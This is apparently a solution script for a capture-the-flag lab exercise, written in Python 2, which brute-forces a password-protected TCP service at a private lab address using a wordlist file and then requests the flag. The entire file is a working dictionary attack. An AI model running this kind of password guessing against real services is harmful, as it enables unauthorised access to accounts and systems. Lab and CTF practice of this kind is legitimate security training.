#!/usr/bin/python

import socket, sys

# Your code goes here


SERV_IP = '192.168.17.50'
TCP_PORT = 1105
BUFFER_SIZE = 1024
MESSAGE = "GET FLAG"

def try_password(password):
  send = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  send.connect((SERV_IP, TCP_PORT))
  data = send.recv(BUFFER_SIZE)
  if("PASSWORD" in data):
    send.send(password)
    data = send.recv(BUFFER_SIZE)
  return data
  send.close()


def get_flag(password):
  send = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  send.connect((SERV_IP, TCP_PORT))
  data = send.recv(BUFFER_SIZE)
  send.send(password)
  data = send.recv(BUFFER_SIZE)
  #"OK"
  send.send(MESSAGE)
  data = send.recv(BUFFER_SIZE)
  return data
    
passwords = []
for line in open("dictionary.txt"):
  tmp = line.rstrip("\n")
  passwords.append(tmp)

for password in passwords:
  message = try_password(password)
  if("DENIED" in message):
    continue
  if("OK" in message): 
    print get_flag(password)
    sys.exit(0)
